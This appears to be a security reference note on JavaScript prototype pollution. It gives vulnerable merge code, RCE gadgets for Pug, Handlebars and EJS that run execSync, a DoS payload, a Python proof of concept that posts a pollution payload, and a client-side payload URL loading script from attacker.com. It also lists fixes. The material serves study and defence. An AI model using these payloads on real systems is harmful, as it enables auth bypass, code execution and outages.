# Prototype Pollution

**Tags:** #high #critical #prototype-pollution #nodejs #javascript #rce
**OWASP:** A08:2021 Software and Data Integrity Failures
**CVSS Base:** 7.5 (High) — 9.8 (Critical — via template engine RCE)

---

## 📖 What it is

In JavaScript/Node.js, if an attacker controls an object key and can insert `__proto__` or `constructor.prototype`, all objects in the process inherit the polluted property — potentially causing Auth Bypass, RCE via template engines, and DoS.

---

## 🔍 `grep_search` Tactics

```
deepMerge
extend(
_.merge
merge(
clone(
Object.assign(
JSON.parse(
__proto__
constructor.prototype
hasOwnProperty
Object.create(null)
lodash
merge-deep
jquery.extend
```

---

## 💣 How It Works

### Core Concept

```javascript
// All objects inherit from Object.prototype
const obj = {};
console.log(obj.isAdmin);  // undefined (normal)

// Polluting Object.prototype
Object.prototype.isAdmin = true;

// Now ALL objects have isAdmin = true!
console.log(obj.isAdmin);  // true  Auth bypass!
console.log({}.isAdmin);   // true  any new object is already "polluted"
```

---

### Injection Vectors

#### 1. Query String (`?__proto__[isAdmin]=true`)

```javascript
//  VULNERABLE  query string copied to object without sanitization
const qs = require('qs');
const query = qs.parse(req.query);  // "?__proto__[isAdmin]=true"

// or
const query = Object.assign({}, req.query);
// query.__proto__.isAdmin = true  pollution!
```

#### 2. JSON Body with `__proto__`

```javascript
//  VULNERABLE  JSON.parse + unsanitized deep merge
function deepMerge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object') {
            deepMerge(target[key], source[key]);  // iterates __proto__!
        } else {
            target[key] = source[key];            // assigns to __proto__!
        }
    }
}

const body = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge({}, body);  //  Object.prototype.isAdmin = true!
```

#### 3. Lodash `_.merge` (vulnerable versions < 4.17.21)

```javascript
//  VULNERABLE  lodash < 4.17.21
const _ = require('lodash');
const userInput = {"__proto__": {"isAdmin": true}};
_.merge({}, userInput);  //  global pollution!
```

---

## 💣 Impact by Category

### Auth Bypass

```javascript
// Permission check code
function checkAdmin(user) {
    return user.isAdmin === true;
}

// Post-pollution with __proto__[isAdmin]=true
const normalUser = {};  // no own isAdmin property
checkAdmin(normalUser);  //  true! (inherited from Object.prototype)
```

#### 1. Pug (formerly Jade)
**Gadget:** `block` or `line`
```javascript
Object.prototype.block = "process.mainModule.require('child_process').execSync('id')";
// or
Object.prototype.line = "process.mainModule.require('child_process').execSync('id')";
```

#### 2. Handlebars
**Gadget:** `type`, `body`
```javascript
Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": { "type": "PathExpression", "data": false, "depth": 0, "parts": ["exec"] },
    "params": [], "hash": null, "escaped": true
}];
```

#### 3. EJS (Embedded JavaScript)
**Gadget:** `client`, `escape`
```javascript
Object.prototype.client = true;
Object.prototype.escape = "process.mainModule.require('child_process').execSync('id')";
```

---

### DoS by Breaking Native Operations

```javascript
Object.prototype.toString = () => { throw new Error("DOS"); };

// Now any toString() on any object breaks
[].toString();  // throw Error  crash
```

---

## 🧪 Detection PoC

```python
# .tmp/validate_proto_pollution.py
import requests, json

TARGET = "http://target.com"
ENDPOINT = "/api/merge"  # endpoint that accepts object merges

# Pollution payload
PAYLOAD = json.dumps({"__proto__": {"polluted": "YES_POLLUTED"}})

r = requests.post(f"{TARGET}{ENDPOINT}", data=PAYLOAD,
                  headers={"Content-Type": "application/json"}, timeout=10)
print(f"POST status: {r.status_code}")

# Check if the pollution propagates to another response
check = requests.get(f"{TARGET}/api/status", timeout=10)
if "polluted" in check.text.lower() or "YES_POLLUTED" in check.text:
    print("[VULN] Prototype Pollution confirmed  polluted property visible globally!")
else:
    print("[OK or not detectable via response]  check auth behavior")
```

---

## 🛡️ Fix

### 1. `Object.create(null)` for cache/store objects

```javascript
//  CORRECT  object without prototype (does not inherit from Object)
const cache = Object.create(null);
cache['__proto__'] = 'safe';  // it's just a property, not the prototype

// Using Map instead of object literals for stores
const store = new Map();
store.set('key', 'value');
store.has('__proto__');  // false  Map does not have prototype as a key
```

### 2. `hasOwnProperty` before iterating

```javascript
//  CORRECT  validate that the key belongs to the object itself
function safeMerge(target, source) {
    for (const key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
            // Explicitly block __proto__ and constructor
            if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                continue;
            }
            if (typeof source[key] === 'object' && source[key] !== null) {
                target[key] = target[key] || {};
                safeMerge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    return target;
}
```

### 3. Update Lodash (version 4.17.21+)

```bash
npm update lodash
npm install lodash@latest
```

### 4. JSON Schema Validation

```javascript
//  CORRECT  validate structure before merges
const Ajv = require('ajv');
const ajv = new Ajv();

const schema = {
    type: 'object',
    additionalProperties: false,  // reject undeclared keys
    properties: {
        name: { type: 'string' },
        age: { type: 'number' },
    }
};

const validate = ajv.compile(schema);
if (!validate(userInput)) {
    throw new Error('Invalid input');
}
```

### [NEW] JSON.parse() Reviver Fix
**How it works:** Using the `reviver` function to block dangerous keys during parsing.
```javascript
const userInput = JSON.parse(payload, (key, value) => {
  if (key === '__proto__' || key === 'constructor') return;
  return value;
});
```

### [NEW] Client-Side Prototype Pollution (CSPP)
**How it works:** Exploiting front-end libraries (like `query-string` or `merge-options`) that take URL parameters and merge them into a configuration object.
**Payload:** `http://site.com/?__proto__[sourceURL]=http://attacker.com/evil.js`
**Target:** Applications using gadgets like `jQuery.getScript` or dynamic script loading.

---

## 🔗 Chain Exploits

```
Prototype Pollution via query string  isAdmin=true  Admin bypass without login
Prototype Pollution + Pug/Handlebars/EJS  RCE via template render
Prototype Pollution + Express middleware  Any property check is bypassed
Prototype Pollution (DoS)  crash Node.js process  Denial of Service
Prototype Pollution + lodash < 4.17.21  supply chain vulnerability
```

---

## 📌 References
- [[dependency-analysis-cve]]
- [[nosql-injection]]
- [[ssti-server-side-template-injection]]
- [Prototype Pollution Research — Portswigger](https://portswigger.net/research/server-side-prototype-pollution)
- [HackTricks Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)